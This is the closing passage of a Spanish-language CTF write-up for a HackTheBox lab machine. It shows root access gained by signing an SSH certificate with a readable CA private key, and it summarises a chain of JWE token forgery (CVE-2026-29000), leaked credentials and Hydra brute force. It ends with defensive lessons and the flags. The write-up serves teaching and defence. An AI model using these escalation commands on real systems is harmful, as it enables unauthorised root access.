+</span></span><span class=line><span class=cl><span class=no>Your</span> <span class=kp>public</span> <span class=n>key</span> <span class=n>has</span> <span class=n>been</span> <span class=n>saved</span> <span class=k>in</span> <span class=n>my_access</span><span class=o>.</span><span class=n>pub</span></span></span></code></pre></div><p>Firmamos la llave pública con la CA. El truco está en los flags:</p><ul><li><code>-s ca</code> — usar la clave privada CA para firmar</li><li><code>-I "root_audit"</code> — identity del certificado</li><li><code>-n root</code> — <strong>principal</strong> (usuario para el que será válido el certificado)</li><li><code>-V +1h</code> — validez de 1 hora</li></ul><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>ssh</span><span class=o>-</span><span class=n>keygen</span> <span class=o>-</span><span class=n>s</span> <span class=n>ca</span> <span class=o>-</span><span class=n>I</span> <span class=s2>&#34;root_audit&#34;</span> <span class=o>-</span><span class=n>n</span> <span class=n>root</span> <span class=o>-</span><span class=n>V</span> <span class=o>+</span><span class=mi>1</span><span class=n>h</span> <span class=n>my_access</span><span class=o>.</span><span class=n>pub</span>
+</span></span><span class=line><span class=cl><span class=no>Signed</span> <span class=n>user</span> <span class=n>key</span> <span class=n>my_access</span><span class=o>-</span><span class=n>cert</span><span class=o>.</span><span class=n>pub</span><span class=p>:</span> <span class=nb>id</span> <span class=s2>&#34;root_audit&#34;</span> <span class=n>serial</span> <span class=mi>0</span> <span class=k>for</span> <span class=n>root</span> <span class=n>valid</span> <span class=n>from</span> <span class=mi>2026</span><span class=o>-</span><span class=mo>06</span><span class=o>-</span><span class=mi>18</span><span class=ss>T22</span><span class=p>:</span><span class=mi>38</span><span class=p>:</span><span class=mo>00</span> <span class=n>to</span> <span class=mi>2026</span><span class=o>-</span><span class=mo>06</span><span class=o>-</span><span class=mi>18</span><span class=ss>T23</span><span class=p>:</span><span class=mi>39</span><span class=p>:</span><span class=mi>17</span></span></span></code></pre></div><p>Y ahora, lo más simple: conectarnos como root:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=err>❯</span> <span class=n>ssh</span> <span class=o>-</span><span class=n>i</span> <span class=n>my_access</span> <span class=n>root</span><span class=vi>@principal</span><span class=o>.</span><span class=n>htb</span>
+</span></span><span class=line><span class=cl><span class=no>Welcome</span> <span class=n>to</span> <span class=no>Ubuntu</span> <span class=mi>24</span><span class=o>.</span><span class=mo>04</span><span class=o>.</span><span class=mi>4</span> <span class=no>LTS</span> <span class=p>(</span><span class=no>GNU</span><span class=o>/</span><span class=no>Linux</span> <span class=mi>6</span><span class=o>.</span><span class=mi>8</span><span class=o>.</span><span class=mi>0</span><span class=o>-</span><span class=mi>101</span><span class=o>-</span><span class=n>generic</span> <span class=n>x86_64</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>root</span><span class=vi>@principal</span><span class=ss>:~</span><span class=c1># cat root.txt</span>
+</span></span><span class=line><span class=cl><span class=n>fe347d72e5fb53a7386c23dfab4c1b4f</span></span></span></code></pre></div><p><strong>root conseguido.</strong></p><hr><h2 id=resumen-de-la-intrusión>Resumen de la Intrusión
+<a class=heading-link href=#resumen-de-la-intrusi%c3%b3n><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><table><thead><tr><th>Fase</th><th>Técnica</th><th>Resultado</th></tr></thead><tbody><tr><td><strong>Recon</strong></td><td>Escaneo Nmap + whatweb</td><td>Identificación de Jetty + pac4j-jwt 6.0.3</td></tr><tr><td><strong>Recon</strong></td><td>Análisis de JS (<code>app.js</code>)</td><td>Endpoints API, esquema JWE, roles</td></tr><tr><td><strong>Explotación</strong></td><td><strong>CVE-2026-29000</strong> (CVSS 10.0)</td><td>Forjado de token JWE → acceso admin</td></tr><tr><td><strong>Recon interno</strong></td><td>Endpoint <code>/api/settings</code></td><td>Credenciales <code>svc-deploy:D3pl0y_$$H_Now42!</code></td></tr><tr><td><strong>Acceso inicial</strong></td><td>SSH con Hydra</td><td>Shell como <code>svc-deploy</code> + flag user</td></tr><tr><td><strong>Privesc</strong></td><td>Abuso de <strong>TrustedUserCAKeys</strong> + CA privada legible</td><td>Firma de certificado SSH → shell como root</td></tr></tbody></table><h3 id=lecciones-aprendidas>Lecciones aprendidas
+<a class=heading-link href=#lecciones-aprendidas><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><ol><li><strong>Nunca expongas la versión exacta de librerías de autenticación</strong> en headers HTTP. <code>X-Powered-By: pac4j-jwt/6.0.3</code> le regaló al atacante el vector de ataque.</li><li><strong>No almacenes contraseñas en texto plano</strong> en settings de aplicaciones web.</li><li><strong>Protege las claves privadas de la CA SSH</strong>. El grupo <code>deployers</code> no debería tener acceso de lectura a <code>/opt/principal/ssh/ca</code>. Una CA comprometida permite firmar certificados para cualquier usuario del sistema.</li><li><strong>Usa certificados con validez corta</strong>. Al menos usaban <code>-V +1h</code>, limitando la ventana de reuso del certificado firmado.</li></ol><hr><h2 id=flags>Flags
+<a class=heading-link href=#flags><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h2><div class=highlight><pre tabindex=0 class=chroma><code class=language-txt data-lang=txt><span class=line><span class=cl>user: 0f556e2c6de811d6afe3be60c3654a8e
+</span></span><span class=line><span class=cl>root: fe347d72e5fb53a7386c23dfab4c1b4f
+</span></span></code></pre></div></div><footer><section class=see-also><h3 id=también-ver-en-hackthebox>También ver en HackTheBox
+<a class=heading-link href=#tambi%c3%a9n-ver-en-hackthebox><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
+<span class=sr-only>Link to heading</span></a></h3><nav><ul><li><a href=/posts/fireflow/>FireFlow</a></li><li><a href=/posts/abducted/>Abducted</a></li><li><a href=/posts/variatype/>VariaType</a></li><li><a href=/posts/snapped/>Snapped CTF</a></li><li><a href=/posts/cap/>Cap CTF</a></li></ul></nav></section></footer></article></section></div><footer class=footer><section class=container>©
+2019 -
+2026
+David León
+·
+Desarrollado por <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>
